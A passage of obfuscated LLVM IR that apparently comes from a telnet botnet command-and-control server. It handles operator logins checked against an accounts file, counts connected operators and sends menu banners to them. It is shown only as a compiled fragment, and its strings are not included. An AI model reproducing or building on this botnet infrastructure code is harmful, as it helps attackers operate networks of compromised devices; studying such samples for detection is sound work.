; <label>:1831:                                   ; preds = %1830, %originalBBpart2239, %1752, %1751, %1714, %originalBBpart2231, %originalBBpart2223, %originalBBpart2219, %1569, %originalBBpart2207, %1539, %1531, %1507, %1483, %1475, %1467, %1459, %1451, %1443, %1435, %1411, %1395, %originalBBpart2187, %1326, %1319, %originalBBpart2179, %1271, %1247, %originalBBpart2163, %1182, %1175, %originalBBpart2159, %1143, %1135, %originalBBpart2155, %originalBBpart2151, %1079, %originalBBpart2143, %1015, %originalBBpart2135, %originalBBpart2127, %originalBBpart2119, %903, %895, %originalBBpart2115, %originalBBpart2111, %823, %739, %668, %617, %596, %571, %563, %555, %531, %523, %originalBBpart263, %475, %451, %originalBBpart251, %originalBBpart247, %332, %331, %originalBBpart239, %originalBBpart227, %originalBBpart223, %191, %originalBBpart215
  %1832 = load i32, i32* %12, align 4
  %1833 = sext i32 %1832 to i64
  %1834 = getelementptr inbounds [1000000 x %struct.telnetdata_t], [1000000 x %struct.telnetdata_t]* @managements, i64 0, i64 %1833
  %1835 = getelementptr inbounds %struct.telnetdata_t, %struct.telnetdata_t* %1834, i32 0, i32 0
  store i32 0, i32* %1835, align 4
  %1836 = load i32, i32* %12, align 4
  %1837 = call i32 @close(i32 %1836)
  %1838 = load volatile i32, i32* @OperatorsConnected, align 4
  %1839 = add nsw i32 %1838, -1
  store volatile i32 %1839, i32* @OperatorsConnected, align 4
  br label %1840

; <label>:1840:                                   ; preds = %1831, %718, %663
  %1841 = load i8*, i8** %10, align 8
  ret i8* %1841

originalBBalteredBB:                              ; preds = %originalBB, %1
  %1842 = alloca i8*, align 8
  %1843 = alloca i8*, align 8
  %1844 = alloca i32, align 4
  %1845 = alloca i32, align 4
  %1846 = alloca i64, align 8
  %1847 = alloca [2048 x i8], align 16
  %1848 = alloca i8*, align 8
  %1849 = alloca i8*, align 8
  %1850 = alloca [2048 x i8], align 16
  %1851 = alloca %struct._IO_FILE*, align 8
  %1852 = alloca i32, align 4
  %1853 = alloca i32, align 4
  %1854 = alloca i32, align 4
  %1855 = alloca i8*, align 8
  %1856 = alloca [80 x i8], align 16
  %1857 = alloca [5000 x i8], align 16
  %1858 = alloca [5000 x i8], align 16
  %1859 = alloca [5000 x i8], align 16
  %1860 = alloca [5000 x i8], align 16
  %1861 = alloca [5000 x i8], align 16
  %1862 = alloca [5000 x i8], align 16
  %1863 = alloca [5000 x i8], align 16
  %1864 = alloca [5000 x i8], align 16
  %1865 = alloca [5000 x i8], align 16
  %1866 = alloca [80 x i8], align 16
  %1867 = alloca [2048 x i8], align 16
  %1868 = alloca [2048 x i8], align 16
  %1869 = alloca [2048 x i8], align 16
  %1870 = alloca [80 x i8], align 16
  %1871 = alloca [80 x i8], align 16
  %1872 = alloca [80 x i8], align 16
  %1873 = alloca [80 x i8], align 16
  %1874 = alloca [80 x i8], align 16
  %1875 = alloca [80 x i8], align 16
  %1876 = alloca [80 x i8], align 16
  %1877 = alloca [80 x i8], align 16
  %1878 = alloca [80 x i8], align 16
  %1879 = alloca [80 x i8], align 16
  %1880 = alloca [80 x i8], align 16
  %1881 = alloca [80 x i8], align 16
  %1882 = alloca [80 x i8], align 16
  %1883 = alloca [80 x i8], align 16
  %1884 = alloca [80 x i8], align 16
  %1885 = alloca [80 x i8], align 16
  %1886 = alloca [80 x i8], align 16
  %1887 = alloca [80 x i8], align 16
  %1888 = alloca [80 x i8], align 16
  %1889 = alloca [80 x i8], align 16
  %1890 = alloca [80 x i8], align 16
  %1891 = alloca [80 x i8], align 16
  %1892 = alloca [2048 x i8], align 16
  %1893 = alloca [2048 x i8], align 16
  %1894 = alloca [80 x i8], align 16
  %1895 = alloca [80 x i8], align 16
  %1896 = alloca [2048 x i8], align 16
  %1897 = alloca %struct._IO_FILE*, align 8
  %1898 = alloca i64, align 8
  %1899 = alloca %struct.tm*, align 8
  %1900 = alloca [50 x i8], align 16
  %1901 = alloca [50 x i8], align 16
  store i8* %0, i8** %1843, align 8
  %1902 = load i8*, i8** %1843, align 8
  %1903 = ptrtoint i8* %1902 to i32
  store i32 %1903, i32* %1844, align 4
  %1904 = load volatile i32, i32* @OperatorsConnected, align 4
  %_ = sub i32 0, %1904
  %gen = add i32 %_, 1
  %1905 = add nsw i32 %1904, 1
  store volatile i32 %1905, i32* @OperatorsConnected, align 4
  %1906 = getelementptr inbounds [2048 x i8], [2048 x i8]* %1847, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %1906, i8 0, i64 2048, i32 16, i1 false)
  %1907 = getelementptr inbounds [2048 x i8], [2048 x i8]* %1850, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %1907, i8 0, i64 2048, i32 16, i1 false)
  store i32 0, i32* %1852, align 4
  %1908 = call %struct._IO_FILE* @fopen(i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.18, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.19, i32 0, i32 0))
  store %struct._IO_FILE* %1908, %struct._IO_FILE** %1851, align 8
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %102
  %1909 = load %struct._IO_FILE*, %struct._IO_FILE** %19, align 8
  %1910 = load i32, i32* %22, align 4
  %1911 = sext i32 %1910 to i64
  %1912 = getelementptr inbounds [22 x %struct.login_info], [22 x %struct.login_info]* @accounts, i64 0, i64 %1911
  %1913 = getelementptr inbounds %struct.login_info, %struct.login_info* %1912, i32 0, i32 0
  %1914 = getelementptr inbounds [20 x i8], [20 x i8]* %1913, i32 0, i32 0
  %1915 = load i32, i32* %22, align 4
  %1916 = sext i32 %1915 to i64
  %1917 = getelementptr inbounds [22 x %struct.login_info], [22 x %struct.login_info]* @accounts, i64 0, i64 %1916
  %1918 = getelementptr inbounds %struct.login_info, %struct.login_info* %1917, i32 0, i32 1
  %1919 = getelementptr inbounds [20 x i8], [20 x i8]* %1918, i32 0, i32 0
  %1920 = call i32 (%struct._IO_FILE*, i8*, ...) @__isoc99_fscanf(%struct._IO_FILE* %1909, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.20, i32 0, i32 0), i8* %1914, i8* %1919)
  %1921 = load i32, i32* %22, align 4
  %_2 = sub i32 %1921, 1
  %gen3 = mul i32 %_2, 1
  %_4 = sub i32 0, %1921
  %gen5 = add i32 %_4, 1
  %1922 = add nsw i32 %1921, 1
  store i32 %1922, i32* %22, align 4
  br label %originalBB1

originalBB9alteredBB:                             ; preds = %originalBB9, %133
  %1923 = load i32, i32* %12, align 4
  %1924 = call i64 @send(i32 %1923, i8* getelementptr inbounds ([22 x i8], [22 x i8]* @.str.21, i32 0, i32 0), i64 22, i32 16384)
  %1925 = icmp eq i64 %1924, -1
  br label %originalBB9

originalBB13alteredBB:                            ; preds = %originalBB13, %153
  br label %originalBB13

originalBB17alteredBB:                            ; preds = %originalBB17, %170
  %1926 = getelementptr inbounds [2048 x i8], [2048 x i8]* %15, i32 0, i32 0
  %1927 = load i32, i32* %12, align 4
  %1928 = call i32 @fdgets(i8* %1926, i32 2048, i32 %1927)
  %1929 = icmp slt i32 %1928, 1
  br label %originalBB17

originalBB21alteredBB:                            ; preds = %originalBB21, %216
  br label %originalBB21

originalBB25alteredBB:                            ; preds = %originalBB25, %238
  br label %originalBB25

originalBB29alteredBB:                            ; preds = %originalBB29, %255
  %1930 = getelementptr inbounds [2048 x i8], [2048 x i8]* %15, i32 0, i32 0
  call void @trim(i8* %1930)
  %1931 = getelementptr inbounds [2048 x i8], [2048 x i8]* %15, i32 0, i32 0
  %1932 = load i32, i32* %13, align 4
  %1933 = sext i32 %1932 to i64
  %1934 = getelementptr inbounds [22 x %struct.login_info], [22 x %struct.login_info]* @accounts, i64 0, i64 %1933
  %1935 = getelementptr inbounds %struct.login_info, %struct.login_info* %1934, i32 0, i32 1
  %1936 = getelementptr inbounds [20 x i8], [20 x i8]* %1935, i32 0, i32 0
  %1937 = call i32 @strcmp(i8* %1931, i8* %1936) #8
  %1938 = icmp ne i32 %1937, 0
  br label %originalBB29

originalBB33alteredBB:                            ; preds = %originalBB33, %282
  %1939 = getelementptr inbounds [2048 x i8], [2048 x i8]* %15, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %1939, i8 0, i64 2048, i32 16, i1 false)
  br label %originalBB33

originalBB37alteredBB:                            ; preds = %originalBB37, %305
  br label %originalBB37

originalBB41alteredBB:                            ; preds = %originalBB41, %334
  %1940 = load i8*, i8** %11, align 8
  %1941 = call i32 @pthread_create(i64* %14, %union.pthread_attr_t* null, i8* (i8*)* @TitleWriter, i8* %1940) #7
  %1942 = getelementptr inbounds [2048 x i8], [2048 x i8]* %35, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %1942, i8 0, i64 2048, i32 16, i1 false)
  %1943 = getelementptr inbounds [5000 x i8], [5000 x i8]* %25, i32 0, i32 0
  %1944 = call i32 (i8*, i8*, ...) @sprintf(i8* %1943, i8* getelementptr inbounds ([92 x i8], [92 x i8]* @.str.26, i32 0, i32 0)) #7
  %1945 = getelementptr inbounds [5000 x i8], [5000 x i8]* %26, i32 0, i32 0
  %1946 = call i32 (i8*, i8*, ...) @sprintf(i8* %1945, i8* getelementptr inbounds ([92 x i8], [92 x i8]* @.str.27, i32 0, i32 0)) #7
  %1947 = getelementptr inbounds [5000 x i8], [5000 x i8]* %27, i32 0, i32 0
  %1948 = call i32 (i8*, i8*, ...) @sprintf(i8* %1947, i8* getelementptr inbounds ([92 x i8], [92 x i8]* @.str.28, i32 0, i32 0)) #7
  %1949 = getelementptr inbounds [5000 x i8], [5000 x i8]* %28, i32 0, i32 0
  %1950 = call i32 (i8*, i8*, ...) @sprintf(i8* %1949, i8* getelementptr inbounds ([92 x i8], [92 x i8]* @.str.29, i32 0, i32 0)) #7
  %1951 = getelementptr inbounds [5000 x i8], [5000 x i8]* %29, i32 0, i32 0
  %1952 = call i32 (i8*, i8*, ...) @sprintf(i8* %1951, i8* getelementptr inbounds ([92 x i8], [92 x i8]* @.str.30, i32 0, i32 0)) #7
  %1953 = getelementptr inbounds [5000 x i8], [5000 x i8]* %30, i32 0, i32 0
  %1954 = call i32 (i8*, i8*, ...) @sprintf(i8* %1953, i8* getelementptr inbounds ([92 x i8], [92 x i8]* @.str.31, i32 0, i32 0)) #7
  %1955 = getelementptr inbounds [5000 x i8], [5000 x i8]* %31, i32 0, i32 0
  %1956 = call i32 (i8*, i8*, ...) @sprintf(i8* %1955, i8* getelementptr inbounds ([158 x i8], [158 x i8]* @.str.32, i32 0, i32 0)) #7
  %1957 = getelementptr inbounds [5000 x i8], [5000 x i8]* %32, i32 0, i32 0
  %1958 = call i32 (i8*, i8*, ...) @sprintf(i8* %1957, i8* getelementptr inbounds ([82 x i8], [82 x i8]* @.str.33, i32 0, i32 0)) #7
  %1959 = getelementptr inbounds [5000 x i8], [5000 x i8]* %33, i32 0, i32 0
  %1960 = call i32 (i8*, i8*, ...) @sprintf(i8* %1959, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.34, i32 0, i32 0)) #7
  %1961 = getelementptr inbounds [80 x i8], [80 x i8]* %34, i32 0, i32 0
  %1962 = load i32, i32* %13, align 4
  %1963 = sext i32 %1962 to i64
  %1964 = getelementptr inbounds [22 x %struct.login_info], [22 x %struct.login_info]* @accounts, i64 0, i64 %1963
  %1965 = getelementptr inbounds %struct.login_info, %struct.login_info* %1964, i32 0, i32 0
  %1966 = getelementptr inbounds [20 x i8], [20 x i8]* %1965, i32 0, i32 0
  %1967 = call i32 (i8*, i8*, ...) @sprintf(i8* %1961, i8* getelementptr inbounds ([74 x i8], [74 x i8]* @.str.35, i32 0, i32 0), i8* %1966) #7
  %1968 = getelementptr inbounds [2048 x i8], [2048 x i8]* %35, i32 0, i32 0
  %1969 = call i32 (i8*, i8*, ...) @sprintf(i8* %1968, i8* getelementptr inbounds ([84 x i8], [84 x i8]* @.str.36, i32 0, i32 0)) #7
  %1970 = load i32, i32* %12, align 4
  %1971 = getelementptr inbounds [5000 x i8], [5000 x i8]* %25, i32 0, i32 0
  %1972 = getelementptr inbounds [5000 x i8], [5000 x i8]* %25, i32 0, i32 0
  %1973 = call i64 @strlen(i8* %1972) #8
  %1974 = call i64 @send(i32 %1970, i8* %1971, i64 %1973, i32 16384)
  %1975 = icmp eq i64 %1974, -1
  br label %originalBB41

originalBB45alteredBB:                            ; preds = %originalBB45, %387
  br label %originalBB45

originalBB49alteredBB:                            ; preds = %originalBB49, %411
  br label %originalBB49

originalBB53alteredBB:                            ; preds = %originalBB53, %428
  %1976 = load i32, i32* %12, align 4
  %1977 = getelementptr inbounds [5000 x i8], [5000 x i8]* %27, i32 0, i32 0
  %1978 = getelementptr inbounds [5000 x i8], [5000 x i8]* %27, i32 0, i32 0
  %1979 = call i64 @strlen(i8* %1978) #8
  %1980 = call i64 @send(i32 %1976, i8* %1977, i64 %1979, i32 16384)
  %1981 = icmp eq i64 %1980, -1
  br label %originalBB53

originalBB57alteredBB:                            ; preds = %originalBB57, %452
  %1982 = load i32, i32* %12, align 4
  %1983 = getelementptr inbounds [5000 x i8], [5000 x i8]* %28, i32 0, i32 0
  %1984 = getelementptr inbounds [5000 x i8], [5000 x i8]* %28, i32 0, i32 0
  %1985 = call i64 @strlen(i8* %1984) #8
  %1986 = call i64 @send(i32 %1982, i8* %1983, i64 %1985, i32 16384)
  %1987 = icmp eq i64 %1986, -1
  br label %originalBB57

originalBB61alteredBB:                            ; preds = %originalBB61, %483
  br label %originalBB61

originalBB65alteredBB:                            ; preds = %originalBB65, %500
  %1988 = load i32, i32* %12, align 4
  %1989 = getelementptr inbounds [5000 x i8], [5000 x i8]* %30, i32 0, i32 0
  %1990 = getelementptr inbounds [5000 x i8], [5000 x i8]* %30, i32 0, i32 0
  %1991 = call i64 @strlen(i8* %1990) #8
  %1992 = call i64 @send(i32 %1988, i8* %1989, i64 %1991, i32 16384)
  %1993 = icmp eq i64 %1992, -1
  br label %originalBB65

originalBB69alteredBB:                            ; preds = %originalBB69, %532
  %1994 = load i32, i32* %12, align 4
  %1995 = getelementptr inbounds [5000 x i8], [5000 x i8]* %32, i32 0, i32 0
  %1996 = getelementptr inbounds [5000 x i8], [5000 x i8]* %32, i32 0, i32 0
  %1997 = call i64 @strlen(i8* %1996) #8
  %1998 = call i64 @send(i32 %1994, i8* %1995, i64 %1997, i32 16384)
  %1999 = icmp eq i64 %1998, -1
  br label %originalBB69

originalBB73alteredBB:                            ; preds = %originalBB73, %572
  br label %originalBB73

originalBB77alteredBB:                            ; preds = %originalBB77, %597
  %2000 = load i32, i32* %12, align 4
  %2001 = call i64 @send(i32 %2000, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.37, i32 0, i32 0), i64 12, i32 16384)
  %2002 = icmp eq i64 %2001, -1
  br label %originalBB77

originalBB81alteredBB:                            ; preds = %originalBB81, %618
  br label %originalBB81

originalBB85alteredBB:                            ; preds = %originalBB85, %669
  br label %originalBB85

originalBB89alteredBB:                            ; preds = %originalBB89, %686
  %2003 = getelementptr inbounds [2048 x i8], [2048 x i8]* %15, i32 0, i32 0
  %2004 = call i8* @strstr(i8* %2003, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.40, i32 0, i32 0)) #8
  %2005 = icmp ne i8* %2004, null
  br label %originalBB89

originalBB93alteredBB:                            ; preds = %originalBB93, %719
  %2006 = load i32, i32* %12, align 4
  %2007 = call i64 @send(i32 %2006, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.37, i32 0, i32 0), i64 12, i32 16384)
  %2008 = icmp eq i64 %2007, -1
  br label %originalBB93

originalBB97alteredBB:                            ; preds = %originalBB97, %741
  %2009 = getelementptr inbounds [2048 x i8], [2048 x i8]* %15, i32 0, i32 0
  %2010 = call i8* @strstr(i8* %2009, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.42, i32 0, i32 0)) #8
  %2011 = icmp ne i8* %2010, null
  br label %originalBB97

originalBB101alteredBB:                           ; preds = %originalBB101, %761
  %2012 = load i8*, i8** %11, align 8
  %2013 = call i32 @pthread_create(i64* %14, %union.pthread_attr_t* null, i8* (i8*)* @TitleWriter, i8* %2012) #7
  %2014 = getelementptr inbounds [80 x i8], [80 x i8]* %38, i32 0, i32 0
  %2015 = load i32, i32* %13, align 4
  %2016 = sext i32 %2015 to i64
  %2017 = getelementptr inbounds [22 x %struct.login_info], [22 x %struct.login_info]* @accounts, i64 0, i64 %2016
  %2018 = getelementptr inbounds %struct.login_info, %struct.login_info* %2017, i32 0, i32 0
  %2019 = getelementptr inbounds [20 x i8], [20 x i8]* %2018, i32 0, i32 0
  %2020 = call i32 (i8*, i8*, ...) @sprintf(i8* %2014, i8* getelementptr inbounds ([54 x i8], [54 x i8]* @.str.43, i32 0, i32 0), i8* %2019) #7
  %2021 = getelementptr inbounds [80 x i8], [80 x i8]* %39, i32 0, i32 0
  %2022 = call i32 (i8*, i8*, ...) @sprintf(i8* %2021, i8* getelementptr inbounds ([68 x i8], [68 x i8]* @.str.44, i32 0, i32 0)) #7
  %2023 = getelementptr inbounds [80 x i8], [80 x i8]* %40, i32 0, i32 0
  %2024 = call i32 (i8*, i8*, ...) @sprintf(i8* %2023, i8* getelementptr inbounds ([72 x i8], [72 x i8]* @.str.45, i32 0, i32 0)) #7
  %2025 = getelementptr inbounds [80 x i8], [80 x i8]* %41, i32 0, i32 0
  %2026 = call i32 (i8*, i8*, ...) @sprintf(i8* %2025, i8* getelementptr inbounds ([56 x i8], [56 x i8]* @.str.46, i32 0, i32 0)) #7
  %2027 = getelementptr inbounds [80 x i8], [80 x i8]* %42, i32 0, i32 0
  %2028 = call i32 (i8*, i8*, ...) @sprintf(i8* %2027, i8* getelementptr inbounds ([60 x i8], [60 x i8]* @.str.47, i32 0, i32 0)) #7
  %2029 = getelementptr inbounds [80 x i8], [80 x i8]* %44, i32 0, i32 0
  %2030 = call i32 (i8*, i8*, ...) @sprintf(i8* %2029, i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.48, i32 0, i32 0)) #7
  %2031 = getelementptr inbounds [80 x i8], [80 x i8]* %45, i32 0, i32 0
  %2032 = call i32 (i8*, i8*, ...) @sprintf(i8* %2031, i8* getelementptr inbounds ([76 x i8], [76 x i8]* @.str.49, i32 0, i32 0)) #7
  %2033 = getelementptr inbounds [80 x i8], [80 x i8]* %46, i32 0, i32 0
  %2034 = call i32 (i8*, i8*, ...) @sprintf(i8* %2033, i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.48, i32 0, i32 0)) #7
  %2035 = getelementptr inbounds [80 x i8], [80 x i8]* %47, i32 0, i32 0
  %2036 = call i32 (i8*, i8*, ...) @sprintf(i8* %2035, i8* getelementptr inbounds ([57 x i8], [57 x i8]* @.str.50, i32 0, i32 0)) #7
  %2037 = getelementptr inbounds [80 x i8], [80 x i8]* %48, i32 0, i32 0
  %2038 = call i32 (i8*, i8*, ...) @sprintf(i8* %2037, i8* getelementptr inbounds ([57 x i8], [57 x i8]* @.str.51, i32 0, i32 0)) #7
  %2039 = getelementptr inbounds [80 x i8], [80 x i8]* %49, i32 0, i32 0
  %2040 = call i32 (i8*, i8*, ...) @sprintf(i8* %2039, i8* getelementptr inbounds ([57 x i8], [57 x i8]* @.str.52, i32 0, i32 0)) #7
  %2041 = getelementptr inbounds [80 x i8], [80 x i8]* %50, i32 0, i32 0
  %2042 = call i32 (i8*, i8*, ...) @sprintf(i8* %2041, i8* getelementptr inbounds ([57 x i8], [57 x i8]* @.str.53, i32 0, i32 0)) #7
  %2043 = getelementptr inbounds [80 x i8], [80 x i8]* %51, i32 0, i32 0
  %2044 = call i32 (i8*, i8*, ...) @sprintf(i8* %2043, i8* getelementptr inbounds ([57 x i8], [57 x i8]* @.str.54, i32 0, i32 0)) #7
  %2045 = getelementptr inbounds [80 x i8], [80 x i8]* %52, i32 0, i32 0
  %2046 = call i32 (i8*, i8*, ...) @sprintf(i8* %2045, i8* getelementptr inbounds ([57 x i8], [57 x i8]* @.str.55, i32 0, i32 0)) #7
  %2047 = getelementptr inbounds [80 x i8], [80 x i8]* %53, i32 0, i32 0
  %2048 = call i32 (i8*, i8*, ...) @sprintf(i8* %2047, i8* getelementptr inbounds ([57 x i8], [57 x i8]* @.str.56, i32 0, i32 0)) #7
  %2049 = getelementptr inbounds [80 x i8], [80 x i8]* %54, i32 0, i32 0
  %2050 = call i32 (i8*, i8*, ...) @sprintf(i8* %2049, i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.48, i32 0, i32 0)) #7
  %2051 = load i32, i32* %12, align 4
  %2052 = getelementptr inbounds [80 x i8], [80 x i8]* %38, i32 0, i32 0
  %2053 = getelementptr inbounds [80 x i8], [80 x i8]* %38, i32 0, i32 0
  %2054 = call i64 @strlen(i8* %2053) #8
  %2055 = call i64 @send(i32 %2051, i8* %2052, i64 %2054, i32 16384)
  %2056 = icmp eq i64 %2055, -1
  br label %originalBB101

originalBB105alteredBB:                           ; preds = %originalBB105, %824
  %2057 = load i32, i32* %12, align 4
  %2058 = getelementptr inbounds [80 x i8], [80 x i8]* %39, i32 0, i32 0
  %2059 = getelementptr inbounds [80 x i8], [80 x i8]* %39, i32 0, i32 0
  %2060 = call i64 @strlen(i8* %2059) #8
  %2061 = call i64 @send(i32 %2057, i8* %2058, i64 %2060, i32 16384)
  %2062 = icmp eq i64 %2061, -1
  br label %originalBB105

originalBB109alteredBB:                           ; preds = %originalBB109, %847
  br label %originalBB109

originalBB113alteredBB:                           ; preds = %originalBB113, %871
  br label %originalBB113

originalBB117alteredBB:                           ; preds = %originalBB117, %911
  br label %originalBB117

originalBB121alteredBB:                           ; preds = %originalBB121, %928
  %2063 = load i32, i32* %12, align 4
  %2064 = getelementptr inbounds [80 x i8], [80 x i8]* %44, i32 0, i32 0
  %2065 = getelementptr inbounds [80 x i8], [80 x i8]* %44, i32 0, i32 0
  %2066 = call i64 @strlen(i8* %2065) #8
  %2067 = call i64 @send(i32 %2063, i8* %2064, i64 %2066, i32 16384)
  %2068 = icmp eq i64 %2067, -1
  br label %originalBB121

originalBB125alteredBB:                           ; preds = %originalBB125, %951
  br label %originalBB125

originalBB129alteredBB:                           ; preds = %originalBB129, %968
  %2069 = load i32, i32* %12, align 4
  %2070 = getelementptr inbounds [80 x i8], [80 x i8]* %45, i32 0, i32 0
  %2071 = getelementptr inbounds [80 x i8], [80 x i8]* %45, i32 0, i32 0
  %2072 = call i64 @strlen(i8* %2071) #8
  %2073 = call i64 @send(i32 %2069, i8* %2070, i64 %2072, i32 16384)
  %2074 = icmp eq i64 %2073, -1
  br label %originalBB129

originalBB133alteredBB:                           ; preds = %originalBB133, %991
  br label %originalBB133

originalBB137alteredBB:                           ; preds = %originalBB137, %1016
  %2075 = load i32, i32* %12, align 4
  %2076 = getelementptr inbounds [80 x i8], [80 x i8]* %47, i32 0, i32 0
  %2077 = getelementptr inbounds [80 x i8], [80 x i8]* %47, i32 0, i32 0
  %2078 = call i64 @strlen(i8* %2077) #8
  %2079 = call i64 @send(i32 %2075, i8* %2076, i64 %2078, i32 16384)
  %2080 = icmp eq i64 %2079, -1
  br label %originalBB137

originalBB141alteredBB:                           ; preds = %originalBB141, %1039
  br label %originalBB141

originalBB145alteredBB:                           ; preds = %originalBB145, %1056
  %2081 = load i32, i32* %12, align 4
  %2082 = getelementptr inbounds [80 x i8], [80 x i8]* %48, i32 0, i32 0
  %2083 = getelementptr inbounds [80 x i8], [80 x i8]* %48, i32 0, i32 0
  %2084 = call i64 @strlen(i8* %2083) #8
  %2085 = call i64 @send(i32 %2081, i8* %2082, i64 %2084, i32 16384)
  %2086 = icmp eq i64 %2085, -1
  br label %originalBB145

originalBB149alteredBB:                           ; preds = %originalBB149, %1087
  br label %originalBB149

originalBB153alteredBB:                           ; preds = %originalBB153, %1111
  br label %originalBB153

originalBB157alteredBB:                           ; preds = %originalBB157, %1151
  br label %originalBB157

originalBB161alteredBB:                           ; preds = %originalBB161, %1207
  br label %originalBB161

originalBB165alteredBB:                           ; preds = %originalBB165, %1224
  %2087 = load i32, i32* %12, align 4
  %2088 = getelementptr inbounds [80 x i8], [80 x i8]* %56, i32 0, i32 0
  %2089 = getelementptr inbounds [80 x i8], [80 x i8]* %56, i32 0, i32 0
  %2090 = call i64 @strlen(i8* %2089) #8
  %2091 = call i64 @send(i32 %2087, i8* %2088, i64 %2090, i32 16384)
  %2092 = icmp eq i64 %2091, -1
  br label %originalBB165

originalBB169alteredBB:                           ; preds = %originalBB169, %1248
  %2093 = load i32, i32* %12, align 4
  %2094 = getelementptr inbounds [80 x i8], [80 x i8]* %57, i32 0, i32 0
  %2095 = getelementptr inbounds [80 x i8], [80 x i8]* %57, i32 0, i32 0
  %2096 = call i64 @strlen(i8* %2095) #8
  %2097 = call i64 @send(i32 %2093, i8* %2094, i64 %2096, i32 16384)
  %2098 = icmp eq i64 %2097, -1
  br label %originalBB169

originalBB173alteredBB:                           ; preds = %originalBB173, %1272
  %2099 = load i32, i32* %12, align 4
  %2100 = getelementptr inbounds [80 x i8], [80 x i8]* %58, i32 0, i32 0
  %2101 = getelementptr inbounds [80 x i8], [80 x i8]* %58, i32 0, i32 0
  %2102 = call i64 @strlen(i8* %2101) #8
  %2103 = call i64 @send(i32 %2099, i8* %2100, i64 %2102, i32 16384)
  %2104 = icmp eq i64 %2103, -1
  br label %originalBB173

originalBB177alteredBB:                           ; preds = %originalBB177, %1295
  br label %originalBB177

originalBB181alteredBB:                           ; preds = %originalBB181, %1328
  %2105 = getelementptr inbounds [2048 x i8], [2048 x i8]* %15, i32 0, i32 0
  %2106 = call i8* @strstr(i8* %2105, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.63, i32 0, i32 0)) #8
  %2107 = icmp ne i8* %2106, null
  br label %originalBB181

originalBB185alteredBB:                           ; preds = %originalBB185, %1358
  br label %originalBB185

originalBB189alteredBB:                           ; preds = %originalBB189, %1375
  %2108 = load i32, i32* %12, align 4
  %2109 = call i64 @send(i32 %2108, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.37, i32 0, i32 0), i64 12, i32 16384)
  %2110 = icmp eq i64 %2109, -1
  br label %originalBB189

originalBB193alteredBB:                           ; preds = %originalBB193, %1412
  %2111 = load i32, i32* %12, align 4
  %2112 = getelementptr inbounds [5000 x i8], [5000 x i8]* %25, i32 0, i32 0
  %2113 = getelementptr inbounds [5000 x i8], [5000 x i8]* %25, i32 0, i32 0
  %2114 = call i64 @strlen(i8* %2113) #8
  %2115 = call i64 @send(i32 %2111, i8* %2112, i64 %2114, i32 16384)
  %2116 = icmp eq i64 %2115, -1
  br label %originalBB193

originalBB197alteredBB:                           ; preds = %originalBB197, %1484
  %2117 = load i32, i32* %12, align 4
  %2118 = getelementptr inbounds [5000 x i8], [5000 x i8]* %32, i32 0, i32 0
  %2119 = getelementptr inbounds [5000 x i8], [5000 x i8]* %32, i32 0, i32 0
  %2120 = call i64 @strlen(i8* %2119) #8
  %2121 = call i64 @send(i32 %2117, i8* %2118, i64 %2120, i32 16384)
  %2122 = icmp eq i64 %2121, -1
  br label %originalBB197

originalBB201alteredBB:                           ; preds = %originalBB201, %1508
  %2123 = load i32, i32* %12, align 4
  %2124 = getelementptr inbounds [5000 x i8], [5000 x i8]* %33, i32 0, i32 0
  %2125 = getelementptr inbounds [5000 x i8], [5000 x i8]* %33, i32 0, i32 0
  %2126 = call i64 @strlen(i8* %2125) #8
  %2127 = call i64 @send(i32 %2123, i8* %2124, i64 %2126, i32 16384)
  %2128 = icmp eq i64 %2127, -1
  br label %originalBB201

originalBB205alteredBB:                           ; preds = %originalBB205, %1548
  br label %originalBB205

originalBB209alteredBB:                           ; preds = %originalBB209, %1570
  br label %originalBB209

originalBB213alteredBB:                           ; preds = %originalBB213, %1592
  %2129 = load i8*, i8** %11, align 8
  %2130 = call i32 @pthread_create(i64* %14, %union.pthread_attr_t* null, i8* (i8*)* @TitleWriter, i8* %2129) #7
  %2131 = getelementptr inbounds [80 x i8], [80 x i8]* %62, i32 0, i32 0
  %2132 = call i32 (i8*, i8*, ...) @sprintf(i8* %2131, i8* getelementptr inbounds ([57 x i8], [57 x i8]* @.str.68, i32 0, i32 0)) #7
  %2133 = load i32, i32* %12, align 4
  %2134 = getelementptr inbounds [80 x i8], [80 x i8]* %62, i32 0, i32 0
  %2135 = getelementptr inbounds [80 x i8], [80 x i8]* %62, i32 0, i32 0
  %2136 = call i64 @strlen(i8* %2135) #8
  %2137 = call i64 @send(i32 %2133, i8* %2134, i64 %2136, i32 16384)
  %2138 = icmp eq i64 %2137, -1
  br label %originalBB213

originalBB217alteredBB:                           ; preds = %originalBB217, %1619
  br label %originalBB217

originalBB221alteredBB:                           ; preds = %originalBB221, %1642
  br label %originalBB221

originalBB225alteredBB:                           ; preds = %originalBB225, %1659
  br label %originalBB225

originalBB229alteredBB:                           ; preds = %originalBB229, %1691
  br label %originalBB229

originalBB233alteredBB:                           ; preds = %originalBB233, %1715
  br label %originalBB233

originalBB237alteredBB:                           ; preds = %originalBB237, %1759
  br label %originalBB237

originalBB241alteredBB:                           ; preds = %originalBB241, %1781
  %2139 = load i32, i32* %13, align 4
  %2140 = sext i32 %2139 to i64
  %2141 = getelementptr inbounds [22 x %struct.login_info], [22 x %struct.login_info]* @accounts, i64 0, i64 %2140
  %2142 = getelementptr inbounds %struct.login_info, %struct.login_info* %2141, i32 0, i32 0
  %2143 = getelementptr inbounds [20 x i8], [20 x i8]* %2142, i32 0, i32 0
  %2144 = getelementptr inbounds [2048 x i8], [2048 x i8]* %15, i32 0, i32 0
